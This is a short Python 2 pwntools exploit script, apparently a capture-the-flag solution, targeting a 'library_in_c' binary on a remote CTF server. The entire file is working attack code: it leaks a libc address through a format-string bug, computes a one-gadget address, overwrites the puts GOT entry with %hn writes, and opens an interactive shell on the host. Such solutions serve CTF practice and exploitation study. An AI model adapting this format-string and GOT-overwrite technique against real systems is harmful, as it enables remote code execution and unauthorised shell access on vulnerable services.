from pwn import *

r = remote("shell.actf.co",20201)
#env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
#r = process("./library_in_c",env=env)
#gdb.attach(r)

puts_got=0x601018

print r.recvuntil("What is your name?\n")
r.sendline("%45$p")
print r.recvuntil("Why hello there ")
leak = r.recvline()
print leak
leak = leak.replace("\n","")
leak=int(leak,16)
libc_base=leak-4040667
system=libc_base+283536
gadget=libc_base+283242

system=hex(system)
print system
gadget=hex(gadget)
print gadget

s1=gadget[-4:]
s2=gadget[-6:-4]
s1=int(s1,16)

byte_count=s1
while(hex(byte_count)[-2:]!=s2):
    byte_count+=1

payload=""

string=""
string+="%"+str(s1)+"c"
string+="%22$hn"
string+="%"+str(byte_count-s1)+"c"
string+="%23$hhn"

junk="a"*(48-len(string))

payload+=string
payload+=junk
payload+=p64(puts_got)
payload+=p64(puts_got+0x2)

print r.recvuntil("And what book would you like to check out?\n")
r.sendline(payload)
print r.recv()
print "System address: "+system
print "Gadget address: "+gadget
r.interactive()